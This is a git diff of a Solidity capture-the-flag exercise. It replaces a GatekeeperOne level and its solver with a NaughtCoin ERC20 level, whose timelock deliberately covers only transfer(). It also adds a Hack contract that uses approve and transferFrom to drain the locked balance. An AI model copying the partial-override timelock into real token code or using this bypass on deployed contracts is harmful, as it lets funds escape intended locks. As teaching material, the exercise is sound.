@@ -1,66 +1,78 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.16;
 
-import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "../node_modules/hardhat-console/contracts/console.sol";
 
 /**
-Make it past the gatekeeper and register as an entrant to pass this level.
+NaughtCoin is an ERC20 token and you're already holding all of them.
+The catch is that you'll only be able to transfer them after a 10 year lockout period.
+Can you figure out how to get them out to another address so that you can transfer them freely?
+Complete this level by getting your token balance to 0.
 
-Things that might help:
-Remember what you've learned from the Telephone and Token levels.
-You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
+  Things that might help
+
+The ERC20 Spec
+The OpenZeppelin codebase
 **/
-contract GatekeeperOne {
+contract NaughtCoin is ERC20 {
 
-  using SafeMath for uint256;
-  address public entrant;
+  // string public constant name = 'NaughtCoin';
+  // string public constant symbol = '0x0';
+  // uint public constant decimals = 18;
+  uint public timeLock = block.timestamp + 10 * 365 days;
+  uint256 public INITIAL_SUPPLY;
+  address public player;
 
-  modifier gateOne() {
-    require(msg.sender != tx.origin, "Gate1 failed");
-    _;
+  constructor() ERC20('NaughtCoin', '0x0') {
+    player = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
+    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
+    // _totalSupply = INITIAL_SUPPLY;
+    // _balances[player] = INITIAL_SUPPLY;
+    _mint(player, INITIAL_SUPPLY);
+    emit Transfer(address(0), player, INITIAL_SUPPLY);
+  }
+  
+  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
+    return super.transfer(_to, _value);
   }
 
-  modifier gateTwo() {
-    require(gasleft().mod(8191) == 0, "Gate2 failed");
-    _;
-  }
+  // Prevent the initial owner from transferring tokens until the timelock has passed
+  modifier lockTokens() {
+    if (msg.sender == player) {
+      require(block.timestamp > timeLock);
+      _;
+    } else {
+     _;
+    }
+  } 
+} 
 
-  modifier gateThree(bytes8 _gateKey) {
-      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
-      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
-      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
-    _;
-  }
-
-  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
-    entrant = tx.origin;
-    return true;
-  }
-}
-
-interface GatekeeperI {
-  function enter(bytes8 _gateKey) external returns (bool);
+interface NaughtCoinI {
+  function balanceOf(address _add) external view returns(uint);
+  function approve(address _spender, uint256 _value) external returns (bool success);
+  function transferFrom(address _from, address _to, uint256 _value) external returns(bool);
 }
 
 contract Hack {
 
-  GatekeeperI gate;
+  NaughtCoinI coin;
+
+  address _to = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
 
   constructor(address _add) {
-    gate = GatekeeperI(_add);
+    coin = NaughtCoinI(_add);
   }
 
-  function getKey() public view returns(bytes8){
-    return bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;
+  function getSenderBalance() public view returns(uint){
+    return coin.balanceOf(msg.sender);
   }
 
   /**
-    // Gas limit should be , was forcefully calculated, by running a call until 'gasleft().mod(8191)'
-    // 858737
+  Call the approve function before and then use hack() to transfer
   **/
   function hack() public {
-    gate.enter(getKey());
+    coin.transferFrom(msg.sender, _to, getSenderBalance());
   }
 
 }
